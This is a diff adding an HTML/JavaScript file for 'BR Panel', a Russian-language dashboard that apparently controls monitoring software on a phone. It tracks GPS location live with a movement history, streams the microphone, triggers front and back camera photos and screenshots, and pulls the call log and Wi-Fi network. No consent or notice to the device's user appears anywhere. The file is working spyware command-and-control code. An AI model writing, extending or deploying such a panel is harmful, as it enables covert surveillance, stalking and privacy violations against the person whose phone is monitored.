@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>BR Panel</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{background:#0d0d0f;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;height:100vh;display:flex;flex-direction:column}
+header{background:#111114;border-bottom:1px solid #222;padding:10px 20px;display:flex;align-items:center;gap:16px;flex-shrink:0}
+header h1{font-size:16px;font-weight:600;color:#fff;letter-spacing:.5px}
+.status-dot{width:8px;height:8px;border-radius:50%;background:#333;transition:background .3s}
+.status-dot.online{background:#22c55e;box-shadow:0 0 6px #22c55e}
+.status-dot.offline{background:#ef4444}
+.status-text{font-size:12px;color:#888}
+header .spacer{flex:1}
+.ping-btn{background:#1a1a2e;border:1px solid #333;color:#aaa;padding:5px 12px;border-radius:6px;cursor:pointer;font-size:12px}
+.ping-btn:hover{border-color:#555;color:#fff}
+
+nav{display:flex;background:#111114;border-bottom:1px solid #1e1e24;flex-shrink:0}
+nav button{background:none;border:none;color:#666;padding:10px 18px;cursor:pointer;font-size:13px;border-bottom:2px solid transparent;transition:all .2s}
+nav button:hover{color:#aaa}
+nav button.active{color:#818cf8;border-bottom-color:#818cf8}
+
+.tab{display:none;flex:1;overflow:hidden}
+.tab.active{display:flex;flex-direction:column}
+
+/* MAP */
+#map{flex:1}
+
+/* AUDIO */
+.audio-panel{padding:24px;display:flex;flex-direction:column;gap:20px;max-width:600px}
+.audio-status{font-size:13px;color:#888}
+.audio-status span{color:#22c55e}
+.big-btn{padding:12px 32px;border-radius:8px;border:none;cursor:pointer;font-size:15px;font-weight:600;transition:all .2s}
+.btn-start{background:#22c55e;color:#000}
+.btn-start:hover{background:#16a34a}
+.btn-stop{background:#ef4444;color:#fff}
+.btn-stop:hover{background:#dc2626}
+.btn-disabled{background:#222;color:#555;cursor:not-allowed}
+canvas#visualizer{background:#111;border-radius:8px;width:100%;height:80px;display:block}
+
+/* CAMERA */
+.cam-panel{padding:24px;display:flex;flex-direction:column;gap:20px}
+.cam-btns{display:flex;gap:12px}
+.cmd-btn{background:#1e1e2e;border:1px solid #333;color:#c4b5fd;padding:10px 20px;border-radius:8px;cursor:pointer;font-size:13px;font-weight:500;transition:all .2s}
+.cmd-btn:hover{background:#2a2a3e;border-color:#818cf8}
+.media-view{display:flex;flex-direction:column;gap:8px}
+.media-view label{font-size:12px;color:#666}
+.media-view img{max-width:100%;max-height:calc(100vh - 240px);border-radius:8px;border:1px solid #222;object-fit:contain;background:#111}
+
+/* SCREEN */
+.screen-panel{padding:24px;display:flex;flex-direction:column;gap:20px}
+
+/* CALLS */
+.calls-panel{padding:24px;display:flex;flex-direction:column;gap:16px;overflow:auto}
+.refresh-row{display:flex;gap:12px;align-items:center}
+.refresh-row span{font-size:12px;color:#555}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:8px 10px;background:#111;color:#666;font-weight:500;border-bottom:1px solid #1e1e24;position:sticky;top:0}
+td{padding:8px 10px;border-bottom:1px solid #1a1a1a}
+tr:hover td{background:#111}
+.type-in{color:#22c55e}
+.type-out{color:#818cf8}
+.type-miss{color:#ef4444}
+
+/* NETWORK */
+.net-panel{padding:24px;display:flex;flex-direction:column;gap:16px;max-width:400px}
+.net-card{background:#111;border:1px solid #1e1e24;border-radius:10px;padding:16px;display:flex;flex-direction:column;gap:10px}
+.net-row{display:flex;justify-content:space-between;font-size:14px}
+.net-row .key{color:#666}
+.net-row .val{color:#e0e0e0;font-weight:500}
+
+/* notification */
+.toast{position:fixed;bottom:20px;right:20px;background:#1e1e2e;border:1px solid #333;padding:10px 16px;border-radius:8px;font-size:13px;animation:fadeIn .2s;z-index:9999}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+</style>
+</head>
+<body>
+
+<header>
+  <div id="dot" class="status-dot offline"></div>
+  <h1>BR Panel</h1>
+  <span id="statusText" class="status-text">offline</span>
+  <div class="spacer"></div>
+  <button class="ping-btn" onclick="cmd('ping')">Ping</button>
+  <button class="ping-btn" onclick="cmd('calls')">Вызовы</button>
+  <button class="ping-btn" onclick="cmd('network')">Сеть</button>
+</header>
+
+<nav>
+  <button class="active" onclick="tab('map',this)">Карта</button>
+  <button onclick="tab('audio',this)">Аудио</button>
+  <button onclick="tab('camera',this)">Камера</button>
+  <button onclick="tab('screen',this)">Экран</button>
+  <button onclick="tab('calls',this)">Звонки</button>
+  <button onclick="tab('network',this)">Сеть</button>
+</nav>
+
+<!-- MAP -->
+<div id="tab-map" class="tab active">
+  <div id="map"></div>
+</div>
+
+<!-- AUDIO -->
+<div id="tab-audio" class="tab">
+  <div class="audio-panel">
+    <div class="audio-status">Устройство: <span id="audioDeviceStatus">offline</span></div>
+    <div style="display:flex;gap:12px">
+      <button id="btnStart" class="big-btn btn-disabled" onclick="audioStart()">▶ Слушать</button>
+      <button id="btnStop"  class="big-btn btn-disabled" onclick="audioStop()">■ Стоп</button>
+    </div>
+    <canvas id="visualizer" width="600" height="80"></canvas>
+  </div>
+</div>
+
+<!-- CAMERA -->
+<div id="tab-camera" class="tab">
+  <div class="cam-panel">
+    <div class="cam-btns">
+      <button class="cmd-btn" onclick="cmd('photo_front')">📸 Передняя</button>
+      <button class="cmd-btn" onclick="cmd('photo_back')">📸 Задняя</button>
+    </div>
+    <div class="media-view">
+      <label id="photoLabel">Нет фото</label>
+      <img id="photoImg" src="" alt="" style="display:none">
+    </div>
+  </div>
+</div>
+
+<!-- SCREEN -->
+<div id="tab-screen" class="tab">
+  <div class="screen-panel">
+    <div>
+      <button class="cmd-btn" onclick="cmd('screenshot')">🖥 Скриншот</button>
+    </div>
+    <div class="media-view">
+      <label id="screenLabel">Нет скриншота</label>
+      <img id="screenImg" src="" alt="" style="display:none">
+    </div>
+  </div>
+</div>
+
+<!-- CALLS -->
+<div id="tab-calls" class="tab">
+  <div class="calls-panel">
+    <div class="refresh-row">
+      <button class="cmd-btn" onclick="cmd('calls')">Обновить</button>
+      <span id="callsCount"></span>
+    </div>
+    <table>
+      <thead><tr><th>Номер</th><th>Имя</th><th>Тип</th><th>Дата</th><th>Длит.</th></tr></thead>
+      <tbody id="callsBody"></tbody>
+    </table>
+  </div>
+</div>
+
+<!-- NETWORK -->
+<div id="tab-network" class="tab">
+  <div class="net-panel">
+    <button class="cmd-btn" style="align-self:start" onclick="cmd('network')">Обновить</button>
+    <div class="net-card" id="netCard">
+      <div class="net-row"><span class="key">Тип</span><span class="val" id="netType">—</span></div>
+      <div class="net-row"><span class="key">SSID</span><span class="val" id="netSsid">—</span></div>
+      <div class="net-row"><span class="key">Время</span><span class="val" id="netTs">—</span></div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ── Tabs ─────────────────────────────────────────────────────────────────────
+function tab(name, btn) {
+  document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('nav button').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  btn.classList.add('active');
+  if (name === 'map') setTimeout(() => map.invalidateSize(), 50);
+}
+
+// ── Map ──────────────────────────────────────────────────────────────────────
+const map = L.map('map').setView([55.75, 37.61], 10);
+L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+  attribution: '© OSM', maxZoom: 19
+}).addTo(map);
+
+const dotIcon = L.divIcon({
+  className: '',
+  html: '<div style="width:12px;height:12px;background:#818cf8;border:2px solid #fff;border-radius:50%;box-shadow:0 0 8px #818cf8"></div>',
+  iconSize: [12, 12], iconAnchor: [6, 6]
+});
+
+let marker = null;
+let trackLine = L.polyline([], { color: '#818cf8', weight: 2, opacity: .6 }).addTo(map);
+
+function updateGeo(d) {
+  const ll = [d.lat, d.lng];
+  if (!marker) {
+    marker = L.marker(ll, { icon: dotIcon }).addTo(map);
+    map.setView(ll, 15);
+  } else {
+    marker.setLatLng(ll);
+  }
+  const pts = trackLine.getLatLngs();
+  pts.push(ll);
+  if (pts.length > 500) pts.shift();
+  trackLine.setLatLngs(pts);
+}
+
+// ── Audio ────────────────────────────────────────────────────────────────────
+let audioCtx = null;
+let nextPlayAt = 0;
+let listenWs = null;
+let audioDeviceOnline = false;
+let visualizerAnim = null;
+const canvas = document.getElementById('visualizer');
+const canvasCtx = canvas.getContext('2d');
+
+function audioDeviceChanged(online) {
+  audioDeviceOnline = online;
+  document.getElementById('audioDeviceStatus').textContent = online ? 'online' : 'offline';
+  document.getElementById('audioDeviceStatus').style.color = online ? '#22c55e' : '#ef4444';
+  updateAudioBtns();
+}
+
+function updateAudioBtns() {
+  const start = document.getElementById('btnStart');
+  const stop  = document.getElementById('btnStop');
+  const listening = listenWs && listenWs.readyState === 1;
+  if (audioDeviceOnline && !listening) {
+    start.className = 'big-btn btn-start'; stop.className = 'big-btn btn-disabled';
+  } else if (listening) {
+    start.className = 'big-btn btn-disabled'; stop.className = 'big-btn btn-stop';
+  } else {
+    start.className = 'big-btn btn-disabled'; stop.className = 'big-btn btn-disabled';
+  }
+}
+
+const pcmBuf = [];
+let flushTimer = null;
+
+function audioStart() {
+  if (!audioDeviceOnline) return;
+  audioCtx = new AudioContext({ sampleRate: 16000 });
+  nextPlayAt = audioCtx.currentTime + 0.1;
+
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  listenWs = new WebSocket(`${proto}://${location.host}/ws/listen`);
+  listenWs.binaryType = 'arraybuffer';
+
+  listenWs.onmessage = e => {
+    if (!(e.data instanceof ArrayBuffer)) return;
+    schedulePcm(e.data);
+    drawViz(e.data);
+  };
+  listenWs.onclose = () => { listenWs = null; updateAudioBtns(); };
+
+  // Tell device to start streaming
+  sendCtl('audio_ctl', 'start');
+  updateAudioBtns();
+}
+
+function audioStop() {
+  sendCtl('audio_ctl', 'stop');
+  if (listenWs) { listenWs.close(); listenWs = null; }
+  if (audioCtx) { audioCtx.close(); audioCtx = null; }
+  clearCanvas();
+  updateAudioBtns();
+}
+
+function schedulePcm(buf) {
+  if (!audioCtx) return;
+  const view = new DataView(buf);
+  const samples = buf.byteLength / 2;
+  const ab = audioCtx.createBuffer(1, samples, 16000);
+  const ch = ab.getChannelData(0);
+  for (let i = 0; i < samples; i++) {
+    ch[i] = view.getInt16(i * 2, true) / 32768;
+  }
+  const src = audioCtx.createBufferSource();
+  src.buffer = ab;
+  src.connect(audioCtx.destination);
+  const when = Math.max(audioCtx.currentTime + 0.05, nextPlayAt);
+  src.start(when);
+  nextPlayAt = when + ab.duration;
+}
+
+function drawViz(buf) {
+  const view = new Int16Array(buf);
+  const w = canvas.width, h = canvas.height;
+  canvasCtx.clearRect(0, 0, w, h);
+  canvasCtx.fillStyle = '#111';
+  canvasCtx.fillRect(0, 0, w, h);
+  canvasCtx.strokeStyle = '#818cf8';
+  canvasCtx.lineWidth = 1;
+  canvasCtx.beginPath();
+  const step = Math.ceil(view.length / w);
+  for (let x = 0; x < w; x++) {
+    const s = view[x * step] / 32768;
+    const y = h / 2 + s * (h / 2 - 4);
+    x === 0 ? canvasCtx.moveTo(x, y) : canvasCtx.lineTo(x, y);
+  }
+  canvasCtx.stroke();
+}
+
+function clearCanvas() {
+  canvasCtx.clearRect(0, 0, canvas.width, canvas.height);
+  canvasCtx.fillStyle = '#111';
+  canvasCtx.fillRect(0, 0, canvas.width, canvas.height);
+}
+
+// ── Commands ─────────────────────────────────────────────────────────────────
+let evtWs = null;
+
+function cmd(c) {
+  if (evtWs && evtWs.readyState === 1) {
+    evtWs.send(JSON.stringify({ type: 'cmd', cmd: c }));
+    toast('→ ' + c);
+  } else {
+    fetch('/api/cmd', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ cmd: c }) });
+    toast('→ ' + c + ' (http)');
+  }
+}
+
+function sendCtl(type, c) {
+  if (evtWs && evtWs.readyState === 1) {
+    evtWs.send(JSON.stringify({ type, cmd: c }));
+  }
+}
+
+// ── WebSocket events ──────────────────────────────────────────────────────────
+function connect() {
+  const proto = location.protocol === 'https:' ? 'wss' : 'ws';
+  evtWs = new WebSocket(`${proto}://${location.host}/ws/events`);
+
+  evtWs.onopen = () => {};
+  evtWs.onclose = () => { setTimeout(connect, 3000); };
+  evtWs.onerror = () => {};
+
+  evtWs.onmessage = e => {
+    const msg = JSON.parse(e.data);
+    switch (msg.type) {
+      case 'device_online':
+        setOnline(true);
+        break;
+      case 'geo':
+        updateGeo(msg.data);
+        break;
+      case 'calls':
+        renderCalls(msg.data);
+        break;
+      case 'network':
+        renderNetwork(msg.data);
+        break;
+      case 'photo':
+        showPhoto(msg.filename, msg.facing);
+        break;
+      case 'screenshot':
+        showScreen(msg.filename);
+        break;
+      case 'pong':
+        toast('Pong ' + new Date(msg.ts).toLocaleTimeString());
+        break;
+      case 'audio_device':
+        audioDeviceChanged(msg.online);
+        break;
+      case 'cmd_ack':
+        toast(msg.ok ? '✓ ' + msg.cmd : '✗ ' + msg.cmd + ' (нет FCM)');
+        break;
+    }
+  };
+}
+
+// ── UI helpers ────────────────────────────────────────────────────────────────
+function setOnline(on) {
+  document.getElementById('dot').className = 'status-dot ' + (on ? 'online' : 'offline');
+  document.getElementById('statusText').textContent = on ? 'online' : 'offline';
+}
+
+function renderCalls(calls) {
+  document.getElementById('callsCount').textContent = calls.length + ' записей';
+  const types = ['', 'входящий', 'исходящий', 'пропущен'];
+  const colors = ['', 'type-in', 'type-out', 'type-miss'];
+  document.getElementById('callsBody').innerHTML = calls.map(c => `
+    <tr>
+      <td>${c.number}</td>
+      <td>${c.name || '—'}</td>
+      <td class="${colors[c.type] || ''}">${types[c.type] || c.type}</td>
+      <td>${new Date(c.date).toLocaleString('ru')}</td>
+      <td>${fmtDur(c.duration)}</td>
+    </tr>`).join('');
+}
+
+function fmtDur(s) {
+  if (!s) return '0с';
+  const m = Math.floor(s / 60), sec = s % 60;
+  return m ? `${m}м ${sec}с` : `${sec}с`;
+}
+
+function renderNetwork(d) {
+  document.getElementById('netType').textContent = d.type || '—';
+  document.getElementById('netSsid').textContent = d.ssid || (d.type === 'wifi' ? '(скрыт)' : '—');
+  document.getElementById('netTs').textContent = d.ts ? new Date(d.ts).toLocaleString('ru') : '—';
+}
+
+function showPhoto(filename, facing) {
+  const img = document.getElementById('photoImg');
+  img.src = '/data/' + filename + '?t=' + Date.now();
+  img.style.display = 'block';
+  document.getElementById('photoLabel').textContent = facing + ' · ' + new Date().toLocaleTimeString('ru');
+  toast('Фото получено (' + facing + ')');
+}
+
+function showScreen(filename) {
+  const img = document.getElementById('screenImg');
+  img.src = '/data/' + filename + '?t=' + Date.now();
+  img.style.display = 'block';
+  document.getElementById('screenLabel').textContent = new Date().toLocaleTimeString('ru');
+  toast('Скриншот получен');
+}
+
+function toast(msg) {
+  const el = document.createElement('div');
+  el.className = 'toast';
+  el.textContent = msg;
+  document.body.appendChild(el);
+  setTimeout(() => el.remove(), 2500);
+}
+
+// ── Init ──────────────────────────────────────────────────────────────────────
+connect();
+
+fetch('/api/state').then(r => r.json()).then(s => {
+  setOnline(s.online);
+  if (s.lastGeo) updateGeo(s.lastGeo);
+  if (s.geoHistory && s.geoHistory.length > 1) {
+    trackLine.setLatLngs(s.geoHistory.map(p => [p.lat, p.lng]));
+  }
+  if (s.lastNetwork) renderNetwork(s.lastNetwork);
+  if (s.calls && s.calls.length) renderCalls(s.calls);
+  if (s.lastPhoto) showPhoto(s.lastPhoto, '');
+  if (s.lastScreen) showScreen(s.lastScreen);
+});
+
+clearCanvas();
+</script>
+</body>
+</html>
